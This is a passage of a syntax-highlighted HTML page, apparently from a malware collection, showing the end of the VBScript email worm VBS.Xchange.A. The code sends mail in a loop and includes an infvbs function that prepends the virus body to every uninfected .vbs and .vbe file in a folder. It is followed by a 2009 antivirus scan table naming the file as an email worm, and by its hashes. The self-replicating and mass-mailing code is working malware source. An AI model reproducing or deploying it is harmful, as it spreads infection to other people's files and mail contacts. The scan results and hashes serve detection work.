+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">F.To</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">F.Send</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">infvbs</span><span class="sc6">(</span><span class="sc7">Folder</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">f.FolderExists</span><span class="sc6">(</span><span class="sc7">Folder</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">each</span><span class="sc0"> </span><span class="sc11">P</span><span class="sc0"> </span><span class="sc3">in</span><span class="sc0"> </span><span class="sc7">f.GetFolder</span><span class="sc6">(</span><span class="sc7">Folder</span><span class="sc6">).</span><span class="sc7">Files</span><span class="sc0">
+</span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc7">f.GetExtensionName</span><span class="sc6">(</span><span class="sc7">P.Name</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc4">"vbs"</span><span class="sc0"> </span><span class="sc3">or</span><span class="sc0"> </span><span class="sc7">ext</span><span class="sc6">=</span><span class="sc4">"vbe"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">VF</span><span class="sc6">=</span><span class="sc7">f.OpenTextFile</span><span class="sc6">(</span><span class="sc7">P.path</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">mark</span><span class="sc6">=</span><span class="sc7">VF.Read</span><span class="sc6">(</span><span class="sc2">14</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">VF.Close</span><span class="sc0">
+
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">mark</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"'VBS.Xchange.A"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">VF</span><span class="sc6">=</span><span class="sc7">f.OpenTextFile</span><span class="sc6">(</span><span class="sc7">P.path</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">VC</span><span class="sc6">=</span><span class="sc7">VF.ReadAll</span><span class="sc0">
+</span><span class="sc7">VF.Close</span><span class="sc0">
+</span><span class="sc7">VCd</span><span class="sc6">=</span><span class="sc7">virus</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">VC</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">VF</span><span class="sc6">=</span><span class="sc7">f.OpenTextFile</span><span class="sc6">(</span><span class="sc7">P.path</span><span class="sc6">,</span><span class="sc2">2</span><span class="sc6">,</span><span class="sc3">True</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">VF.Write</span><span class="sc0"> </span><span class="sc7">VCd</span><span class="sc0">
+</span><span class="sc7">VF.Close</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
+</span>
+<span class="sc0"><table border="1"><tr><td colspan="4">File xchange_a.vbs received on 2009.06.10 04:48:56 (UTC)</td></tr><tr><td>Antivirus</td><td>Version</td><td>Last Update</td><td>Result</td</tr><tr><td>a-squared</td><td>4.5.0.18</td><td>2009.06.10</td><td style="color: red;">Email-Worm.VBS.Xchange.A!IK</td</tr><tr><td>AhnLab-V3</td><td>5.0.0.2</td><td>2009.06.09</td><td style="color: red;">VBS/Chu</td</tr><tr><td>AntiVir</td><td>7.9.0.183</td><td>2009.06.09</td><td style="color: red;">Worm/Chu.1</td</tr><tr><td>Antiy-AVL</td><td>2.0.3.1</td><td>2009.06.10</td><td style="color: red;">Worm/VBS.VBS</td</tr><tr><td>Authentium</td><td>5.1.2.4</td><td>2009.06.10</td><td style="color: red;">VBS/Chu.A@mm</td</tr><tr><td>Avast</td><td>4.8.1335.0</td><td>2009.06.09</td><td style="color: red;">VBS:Malware-gen</td</tr><tr><td>AVG</td><td>8.5.0.339</td><td>2009.06.09</td><td style="color: red;">I-Worm/Petik</td</tr><tr><td>BitDefender</td><td>7.2</td><td>2009.06.10</td><td style="color: red;">Generic.ScriptWorm.72BAC97E</td</tr><tr><td>CAT-QuickHeal</td><td>10.00</td><td>2009.06.10</td><td style="color: red;">VBS/Chu.A</td</tr><tr><td>ClamAV</td><td>0.94.1</td><td>2009.06.10</td><td style="color: red;">Worm.Chu.1</td</tr><tr><td>Comodo</td><td>1299</td><td>2009.06.10</td><td style="color: red;">Email-Worm.VBS.Chu.a</td</tr><tr><td>DrWeb</td><td>5.0.0.12182</td><td>2009.06.10</td><td style="color: red;">VBS.Generic.15</td</tr><tr><td>eSafe</td><td>7.0.17.0</td><td>2009.06.09</td><td style="color: red;">VBS.FireBurn.</td</tr><tr><td>eTrust-Vet</td><td>31.6.6550</td><td>2009.06.09</td><td style="color: red;">VBS/VBSWG!generic</td</tr><tr><td>F-Prot</td><td>4.4.4.56</td><td>2009.06.10</td><td style="color: red;">VBS/Chu.A@mm</td</tr><tr><td>F-Secure</td><td>8.0.14470.0</td><td>2009.06.09</td><td style="color: red;">Email-Worm.VBS.Chu.a</td</tr><tr><td>Fortinet</td><td>3.117.0.0</td><td>2009.06.09</td><td style="color: red;">VBS/Chu.A@mm</td</tr><tr><td>GData</td><td>19</td><td>2009.06.10</td><td style="color: red;">Generic.ScriptWorm.72BAC97E</td</tr><tr><td>Ikarus</td><td>T3.1.1.59.0</td><td>2009.06.10</td><td>-</td</tr><tr><td>K7AntiVirus</td><td>7.10.757</td><td>2009.06.08</td><td>-</td</tr><tr><td>Kaspersky</td><td>7.0.0.125</td><td>2009.06.10</td><td style="color: red;">Email-Worm.VBS.Chu.a</td</tr><tr><td>McAfee</td><td>5641</td><td>2009.06.09</td><td style="color: red;">VBS/Generic@MM</td</tr><tr><td>McAfee+Artemis</td><td>5641</td><td>2009.06.09</td><td style="color: red;">VBS/Generic@MM</td</tr><tr><td>McAfee-GW-Edition</td><td>6.7.6</td><td>2009.06.10</td><td style="color: red;">Worm.Chu.1</td</tr><tr><td>Microsoft</td><td>1.4701</td><td>2009.06.10</td><td style="color: red;">Virus:VBS/Chu</td</tr><tr><td>NOD32</td><td>4142</td><td>2009.06.09</td><td style="color: red;">probably unknown SCRIPT</td</tr><tr><td>Norman</td><td>6.01.09</td><td>2009.06.09</td><td style="color: red;">VBS/Chu.D</td</tr><tr><td>nProtect</td><td>2009.1.8.0</td><td>2009.06.10</td><td style="color: red;">VBS.Chu.B@mm</td</tr><tr><td>Panda</td><td>10.0.0.14</td><td>2009.06.09</td><td style="color: red;">VBS/Chu</td</tr><tr><td>PCTools</td><td>4.4.2.0</td><td>2009.06.09</td><td style="color: red;">VBS.Petxch.A</td</tr><tr><td>Prevx</td><td>3.0</td><td>2009.06.10</td><td>-</td</tr><tr><td>Rising</td><td>21.33.20.00</td><td>2009.06.10</td><td style="color: red;">Script.VBS.Chu</td</tr><tr><td>Sophos</td><td>4.42.0</td><td>2009.06.10</td><td style="color: red;">VBS/Xchange-A</td</tr><tr><td>Sunbelt</td><td>3.2.1858.2</td><td>2009.06.09</td><td>-</td</tr><tr><td>Symantec</td><td>1.4.4.12</td><td>2009.06.10</td><td style="color: red;">VBS.Pet_Tick.gen</td</tr><tr><td>TheHacker</td><td>6.3.4.3.342</td><td>2009.06.10</td><td>-</td</tr><tr><td>TrendMicro</td><td>8.950.0.1092</td><td>2009.06.09</td><td style="color: red;">VBS_CHU.A</td</tr><tr><td>VBA32</td><td>3.12.10.7</td><td>2009.06.10</td><td style="color: red;">Email-Worm.VBS.Chu.a</td</tr><tr><td>ViRobot</td><td>2009.6.9.1775</td><td>2009.06.09</td><td>-</td</tr><tr><td>VirusBuster</td><td>4.6.5.0</td><td>2009.06.09</td><td style="color: red;">VBS.Petxch.A</td</tr><tr><td colspan="4">&nbsp;</td></tr><tr><td colspan="4">Additional information</td></tr><tr><td colspan="4">File size: 5770 bytes</td></tr><tr><td colspan="4">MD5...: de34d735d30bd0e107e14bb6aa8bf3e0</td></tr><tr><td colspan="4">SHA1..: 8d976194e4ae851e0408c53f0db41f9c6f994a46</td></tr><tr><td colspan="4">SHA256: c00b0dfc5a1025f202e05202361d2557ed860238f51692337122d42a889cf412</td></tr><tr><td colspan="4">ssdeep: -<br></td></tr><tr><td colspan="4">PEiD..: -</td></tr><tr><td colspan="4">TrID..: File type identification<br>Unknown!</td></tr><tr><td colspan="4">PEInfo: -</td></tr><tr><td colspan="4">PDFiD.: -</td></tr><tr><td colspan="4">RDS...: NSRL Reference Data Set<br>-</td></tr></table></span>
+</div></body>
+</html>
